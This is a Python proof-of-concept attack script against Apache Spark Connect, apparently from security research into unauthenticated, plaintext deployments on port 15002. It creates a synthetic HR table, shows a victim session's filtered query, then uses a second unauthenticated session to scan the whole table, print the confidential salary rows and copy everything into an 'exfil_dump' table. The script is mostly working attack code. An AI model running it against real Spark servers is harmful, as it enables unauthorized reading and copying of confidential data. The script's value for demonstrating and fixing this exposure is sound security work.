"""
Attack C: Plan Mutation / Arbitrary Plan Submission
Without TLS, query plans transit as plaintext protobuf. A MITM can:
  - Remove WHERE clauses before they reach the server
  - Substitute a different query entirely

We demonstrate the attack surface: an attacker who can reach port 15002 can
submit ANY query plan, including ones that bypass application-layer filters.
In a MITM scenario, the attacker intercepts the client's filtered plan and
resubmits without the filter.
"""

import time
from pyspark.sql import SparkSession

def make_fresh_session(host, port):
    SparkSession._instantiatedSession = None
    return SparkSession.builder.remote(f"sc://{host}:{port}").create()

def run_attack_c(host="localhost", port=15002, verbose=True):
    results = {"attack": "C", "description": "Arbitrary plan submission / filter bypass"}
    t0 = time.time()

    # Authorized client session (victim app)
    spark_victim_app = make_fresh_session(host, port)

    # Setup: create a table with restricted data
    spark_victim_app.sql("DROP TABLE IF EXISTS hr_records")
    spark_victim_app.sql("""
        CREATE TABLE hr_records USING parquet AS
        SELECT
            id,
            CASE WHEN id < 3 THEN 'CONFIDENTIAL' ELSE 'INTERNAL' END AS sensitivity,
            'Employee_' || cast(id AS STRING) AS name,
            cast(50000 + (id * 7919 % 100000) AS INT) AS salary
        FROM range(10)
    """)

    if verbose:
        print("[+] Created hr_records (2 CONFIDENTIAL, 8 INTERNAL rows)")

    # Victim app runs a query filtered to only INTERNAL rows
    filtered_rows = spark_victim_app.sql(
        "SELECT * FROM hr_records WHERE sensitivity = 'INTERNAL' ORDER BY id"
    ).collect()
    results["victim_filtered_rows"] = len(filtered_rows)
    if verbose:
        print(f"[+] Victim app (with WHERE filter): {len(filtered_rows)} rows returned")
        print(f"    (CONFIDENTIAL rows correctly excluded)")

    # --- Attacker: separate unauthenticated client, submits plan WITHOUT filter ---
    spark_attacker = make_fresh_session(host, port)

    # Full table scan — no WHERE clause
    all_rows = spark_attacker.table("hr_records").orderBy("id").collect()
    confidential_rows = [r for r in all_rows if r.sensitivity == 'CONFIDENTIAL']
    results["attacker_all_rows"] = len(all_rows)
    results["confidential_exposed"] = len(confidential_rows)
    results["success"] = len(confidential_rows) > 0

    if verbose:
        print(f"\n[+] Attacker submits full-scan plan (no filter): {len(all_rows)} rows")
        print(f"[+] CONFIDENTIAL rows now exposed: {len(confidential_rows)}")
        for r in confidential_rows:
            print(f"    id={r.id}  sensitivity={r.sensitivity}  name={r.name}  salary={r.salary}")

    # Demonstrate write mutation: attacker redirects a write to a different table
    spark_attacker.sql("DROP TABLE IF EXISTS exfil_dump")
    spark_attacker.sql("CREATE TABLE exfil_dump USING parquet AS SELECT * FROM hr_records")
    exfil_count = spark_attacker.table("exfil_dump").count()
    results["exfil_rows_written"] = exfil_count
    if verbose:
        print(f"\n[+] Attacker wrote all {exfil_count} rows to exfil_dump table")

    # Cleanup
    spark_victim_app.sql("DROP TABLE IF EXISTS hr_records")
    spark_attacker.sql("DROP TABLE IF EXISTS exfil_dump")
    spark_victim_app.stop()
    spark_attacker.stop()

    results["total_ms"] = round((time.time() - t0) * 1000, 1)
    return results

if __name__ == "__main__":
    res = run_attack_c()
    print(f"\n[RESULT] Attack C: {'SUCCEEDED' if res['success'] else 'FAILED'}")
    print(f"  Victim filtered query returned:  {res['victim_filtered_rows']} rows")
    print(f"  Attacker unfiltered plan returned: {res['attacker_all_rows']} rows")
    print(f"  CONFIDENTIAL rows exposed:       {res['confidential_exposed']}")
    print(f"  Rows exfiltrated to dump table:  {res.get('exfil_rows_written', 0)}")
    print(f"  Total time: {res['total_ms']} ms")
